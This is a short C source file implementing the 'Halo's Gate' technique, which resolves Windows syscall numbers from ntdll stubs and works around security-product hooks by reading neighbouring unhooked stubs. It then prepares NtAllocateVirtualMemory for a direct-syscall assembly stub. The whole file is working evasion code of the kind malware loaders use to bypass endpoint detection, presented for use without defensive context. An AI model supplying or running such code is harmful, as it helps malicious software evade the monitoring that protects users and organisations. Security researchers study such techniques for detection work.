#include <windows.h>
#include <stdio.h>

// Fox's dynamic SSN resolver (Halo's Gate approach)
WORD FindSyscallNumber(PVOID functionAddress) {
    PBYTE pStub = (PBYTE)functionAddress;

    // 1. Check if unhooked: 4C 8B D1 B8 [SSN] [SSN]
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1 && pStub[3] == 0xB8) {
        return *((PWORD)(pStub + 4));
    }

    // 2. If hooked (e.g., starts with E9 JMP), search neighbors.
    // Syscall stubs are typically 32 (0x20) bytes apart in memory.
    for (WORD idx = 1; idx <= 500; idx++) {
        // Search down (higher memory addresses)
        PBYTE pDown = pStub + (idx * 32);
        if (pDown[0] == 0x4C && pDown[1] == 0x8B && pDown[2] == 0xD1 && pDown[3] == 0xB8) {
            // Found a clean neighbor below us. Subtract the index to get our SSN.
            return *((PWORD)(pDown + 4)) - idx;
        }

        // Search up (lower memory addresses)
        PBYTE pUp = pStub - (idx * 32);
        if (pUp[0] == 0x4C && pUp[1] == 0x8B && pUp[2] == 0xD1 && pUp[3] == 0xB8) {
            // Found a clean neighbor above us. Add the index to get our SSN.
            return *((PWORD)(pUp + 4)) + idx;
        }
    }
    
    return 0; // Failed to resolve
}

int main() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    PVOID pNtAlloc = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    WORD ssn = FindSyscallNumber(pNtAlloc);
    if (ssn != 0) {
        printf("[+] Calculated SSN for NtAllocateVirtualMemory: 0x%X\n", ssn);
        printf("[+] Now pass this SSN to your custom ASM stub to execute safely.\n");
        
        /* ASM Stub looks like this:
           mov r10, rcx
           mov eax, [ssn]
           syscall
           ret
        */
    } else {
        printf("[-] Failed to resolve SSN.\n");
    }
    
    return 0;
}